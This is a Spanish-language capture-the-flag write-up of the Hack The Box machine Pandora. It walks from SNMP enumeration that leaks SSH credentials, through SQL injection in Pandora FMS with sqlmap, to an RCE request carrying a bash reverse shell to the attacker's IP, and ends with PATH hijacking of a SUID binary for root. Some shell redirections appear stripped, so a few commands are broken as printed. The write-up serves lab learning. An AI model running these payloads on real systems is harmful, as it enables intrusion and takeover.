@@ -1,0 +1,228 @@
+---
+title: 'CTF - Pandora WriteUp'
+date: '2022-01-29'
+tags: ["CTF", "Pentesting", "Hacking", "Pivoting", "Suid"]
+draft: false
+authors: ['default']
+summary: He de decir que esta máquina aunque se encuentra entre las fáciles me ha costado más de lo que me i
+---
+
+He de decir que esta máquina aunque se encuentra entre las fáciles, me ha costado más de lo que me imaginaba y de hecho, los usuarios de la plataforma tienen otra opinión de la dificultad al respecto, como se puede ver en la imagen inferior:
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_1.png)1. Reconocimiento
+-----------------
+
+Antes de nada, añadimos a nuestro /etc/hosts el dominio de la máquina por si estuviese sirviendo un servicio a través de algún virtual hosting.
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_3.png)/etc/hosts filePrimero de todo, verificamos conexión con el objetivo.
+
+
+```
+ping -c 1 pandora.htb -R
+PING pandora.htb (10.10.11.136) 56(124) bytes of data.
+64 bytes from pandora.htb (10.10.11.136): icmp_seq=1 ttl=63 time=43.7 ms
+RR: 	10.10.14.16 (10.10.14.16)
+	10.10.10.2 (10.10.10.2)
+	pandora.htb (10.10.11.136)
+	pandora.htb (10.10.11.136)
+	10.10.14.1 (10.10.14.1)
+	10.10.14.16 (10.10.14.16)
+```
+Siendo el TTL~64, podemos asumir que nos encontramos ante una máquina Linux, en lugar de Windows, puesto que estas últimas suelen tener TTL~128.
+
+Lanzamos un primer comando de NMAP con el fin de enumerar puertos TCP abiertos.
+
+
+```
+nmap -p- -sT --min-rate 5000 --open -vvv -n -Pn -oG allPorts pandora.htb
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.136 ()	Status: Up
+Host: 10.10.11.136 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Mon Jan 24 18:01:26 2022 -- 1 IP address (1 host up) scanned in 50.99 seconds
+```
+Veo que el puerto 80 está abierto y trato de ver que me encuentro:
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_4.png)Static websiteTras haber investigado la web y haber un poco de Fuzzing, doy con una vía muerta. Continúo examinando los puertos UDP a ver que me encuentro.
+
+
+```
+nmap -p- -sU --min-rate 5000 --open -vvv -n -Pn -oG allPortsUdp pandora.htb 
+```
+nmap UDP port reconnaissance commandEn este caso, después de haber echado un vistazo a los puertos TCP y no haber encontrado nada interesante, nos interesa mirar los puertos UDP de la máquina por si hay algo que nos pueda resultar útil. Tras haber examinado los puertos, nos encontramos con el puerto 161/UDP abierto. Tras lanzar el siguiente script obtenemos más información al respecto.
+
+
+```
+nmap -sUV -p161 -oN targetedUdp pandora.htb
+Nmap scan report for pandora.htb (10.10.11.136)
+Host is up (0.043s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+Service Info: Host: pandora
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jan 25 19:12:28 2022 -- 1 IP address (1 host up) scanned in 2.07 seconds
+```
+SNMP es un protocolo de gestión de red que sirve para monitorizar de forma centralizada el estado de distintos dispositivos conectados a una misma red.
+
+2. Análisis de vulnerabilidades
+-------------------------------
+
+Con el siguiente comando lanzamos un cliente SNMP e imprimimos el resultado en un archivo de texto que posteriormente analizaremos:
+
+
+```
+snmpwalk -v 2c -O n -c public pandora.htb  snmp.txt
+```
+Analizando el archivo snmp.txt y realizando una lectura diagonal de las más de 2000 líneas que contiene, me encuentro con el siguiente resultado:
+
+
+```
+.1.3.6.1.2.1.25.4.2.1.5.832 = STRING: "-f"
+2034   │ .1.3.6.1.2.1.25.4.2.1.5.836 = STRING: "-f"
+2035   │ .1.3.6.1.2.1.25.4.2.1.5.840 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
+```
+Hay un usuario denominado "daniel". Intentamos conectarnos a la máquina con las credenciales y...
+
+
+```
+ssh daniel@pandora.htb
+daniel@pandora.htb's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+Last login: Sat Jan 29 16:40:25 2022 from 10.10.15.11
+daniel@pandora:~$ whoami
+daniel
+daniel@pandora:~$ hostname -I
+10.10.11.136 
+```
+Estamos dentro. Nos anotamos las credenciales por si las volviésemos a necesitar posteriormente. Continuamos examinando el equipo. Hay otro usuario en el equipo llamado Matt y no podemos entrar en su directorio. Pero quiero saber que es ese proceso (/usr/bin/host\_check) que requería las credenciales de dani.
+
+Imprimo las cadenas de caracteres que contiene el binario y me encuentro la siguiente URL: [http://127.0.0.1/pandora\_console/include/api.php?op=get&op2=all\_agents&return\_type=csv&other\_mode=url\_encode\_separator\_|&user=daniel&pass=HotelBabylon23](http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23)
+
+Si accedo desde mi máquina, no puedo ver nada. Solo tengo acceso desde el sistema de daniel. 
+
+![](https://blog.ikerocio.com/content/images/2022/01/pivoting-4.svg)Pivoting schema
+```
+ssh -L 8080:pandora.htb:80 daniel@pandora.htb
+```
+Dado que desde pandora.htb, lanzando una petición al puerto 80 soy capaz de ver la nueva máquina, con el comando de arriba realizo un túnel ssh que sincroniza mi puerto local 8080 con el puerto 80 de destino. De esta manera, soy capaz de acceder a la siguiente ventana:
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_5.png)Pandora FMS 742 login3. Explotación
+--------------
+
+PandoraFMS es un software de monitorización de red que coincide con lo que habíamos descubierto hasta ahora. Llegados a este punto, el siguiente paso natural es comprobar si la versión que hay instalada de pandora (PandoraFMS472) es vulnerable a algún tipo de exploit. Y sí, tras una pequeña búsqueda en Google nos podemos encontrar el siguiente link [(CVE-2021-32099)](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained).
+
+En él, podemos ver que hay un archivo .php vulnerable a SQL Injection. El archivo en cuestión es **/include/chart\_generator.php**, y el parámetro inyectable es **session\_id**.
+
+Tras efectuar unas pruebas a http://127.0.0.1:8080/pandora\_console/include/chart\_generator.php?session\_id=1'+or+1=1 podemos confirmar que dicho parámetro es susceptible de inyecciones SQL.
+
+
+```
+SQL error
+: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '1' or 1=1' LIMIT 1') in
+/var/www/pandora/pandora_console/include/db/mysql.php
+on line 114
+Access is not granted
+```
+Además, el reporte de la vulnerabilidad nos alerta de la posibilidad de efectuar un bypass de autenticación si fuésemos capaces de introducir un ID de sesión válido.
+
+Es el turno de recurrir a SQLMap.
+
+Tras aprovecharnos de la vulnerabilidad y de enumerar las diferentes tablas de la base de datos con sqlmap, vamos a proceder a lanzar un último comando con el fin de recuperar un identificador de sesión del usuario Matt.
+
+
+```
+sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1 -D pandora --sql-query="SELECT * FROM tsessions_php WHERE data LIKE '%mat%'"
+```
+De esta forma, si accedo desde mi navegador a http://localhost:8080/pandora\_console/include/chart\_generator.php?session\_id=gathered\_session\_id y posteriormente a http://localhost:8080/pandora\_console/index.php, me encontraré dentro del sistema.
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_6.png)Pandora FMS 742 indexLlegados a este punto, tras visitar cada uno de los menús en busca de alguna opción de continuar con el proceso, me he decantado por buscar en internet vulnerabilidades relativas a PandoraFMS de ejecución de código remoto o RCE. He encontrado un [enlace](https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/) donde se describe un script de Metasploit que permite hacer esto. He decidido lanzar Burpsuite para interceptar la petición que lanza el script y ver con mis propios ojos que hace el exploit. Tras incrustarle la cookie que me permite estar autenticado y ver la ubicación de donde poner el comando a ejecutar, he obtenido la primera flag básica del usuario Matt.
+
+![](https://blog.ikerocio.com/content/images/2022/01/burpsuite2.png)Burpsuite repeaterPosteriormente, he utilizado de nuevo Burpsuite para recibir en mi máquina una reverse shell de Matt.
+
+Ejecuto netcat en escucha en mi máquina local en el puerto 443
+
+
+```
+nc -lvp 443
+```
+y en Burpsuite preparo la petición con la IP de mi máquina, apuntando al puerto 443 donde voy a recibir la shell del usuario que está ejecutando PandoraFMS
+
+
+```
+# php -r 'system("bash -c \"bash -i & /dev/tcp/10.10.15.17/443 0&1\"");'
+include/ajax/events&perform_evento_responses=100000&targets=php%20-r%20%27system%28%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.17%2F443%200%3E%261%5C%22%22%29%3B%27&response_id=1
+```
+4. Escalado de privilegios
+--------------------------
+
+Cada vez queda menos para el final. Una vez dentro, como Matt, necesito convertirme en el usuario root. Para ello, vamos a buscar ficheros con el privilegio SUID. Este privilegio lo que hace es que el que ejecute el dicho fichero, lo hará con los permisos del creador del archivo.
+
+Nos vamos a la raíz y ejecutamos lo siguiente:
+
+
+```
+cd /
+
+matt@pandora:/$ find \-perm -4000 2/dev/null
+find \-perm -4000 2/dev/null
+...
+./usr/bin/pandora_backup
+
+matt@pandora:/$ ls -l /usr/bin/pandora_backup
+-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
+```
+He eliminado parte del output para quedarnos con lo más importante.
+
+El binario /usr/bin/pandora\_backup tiene permisos de ejecución por los miembros del grupo Matt. Y recordamos que el usuario con el que tenemos acceso ahora es Matt.
+
+Pero esto no es suficiente. Necesitamos saber que hace ese binario para ver si podemos inyectar algún tipo de código malicioso para que sea el usuario root quien lo ejecute. Si imprimimos los caracteres del binario con el fin de sacar algo más de información, observamos lo siguiente:
+
+
+```
+matt@pandora:/$ cat /usr/bin/pandora_backup
+ELF�@0:@8
+          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � 
+```
+El binario ejecuta el comando TAR desde una ruta relativa. Esto da lugar a un tipo de vulnerabilidad conocida como Path Hijacking.
+
+Los comandos que se pueden ejecutar de forma relativa es gracias a la variable de entorno PATH. Si imprimimos PATH obtenemos lo siguiente:
+
+
+```
+matt@pandora:/var/www/pandora/pandora_console$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+Linux, busca dentro de esas rutas absolutas el binario del comando que quieres ejecutar. Es decir, primero buscará TAR en /usr/local/sbin, luego en /usr/local/bin, luego en /usr/sbin y así sucesivamente.
+
+De esta forma, lo que se puede hacer es modificar la variable PATH para tener otra ubicación absoluta, pero una que a mi me interese. En ella, almacenaré un binario denominado TAR que ejecutará una shell. Y gracias a que pandora\_backup es un archivo con permisos SUID y su propietario es root, obtendré automáticamente una shell con permisos totales del sistema.
+
+Allá vamos. Lo primero que vamos a hacer es tener una shell más confiable. Vamos a generarle a Matt una clave pública/privada con el fin de poder conectarnos por ssh sin contraseña (recordamos que no la tenemos, hemos accedido a la shell por una shell reversa).
+
+
+```
+cd /home/matt && ssh-keygen
+```
+Nos copiamos la id\_rsa (clave privada) en nuestra máquina e id\_rsa.pub (clave pública) la ponemos dentro del fichero authorized\_keys de la máquina atacada.
+
+De esta forma, podrémos crear una shell desde nuestra máquina y efectuar los siguientes comandos para efectuar la vulnerabilidad de Path Hijacking.
+
+
+```
+iocio@127.0.0.1:~$ chmod 600 id_rsa && ssh -i id_rsa matt@pandora.htb
+matt@pandora:~$ export PATH=/tmp:$PATH
+matt@pandora:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+matt@pandora:~$ /usr/bin/pandora_backup 
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:~# whoami
+root
+```
+Y listo. Ya tenemos acceso al sistema. Recuperamos la flag y terminamos con la máquina.
+
+
+```
+root@pandora:~# cat /root/root.txt 
+XXX
+```
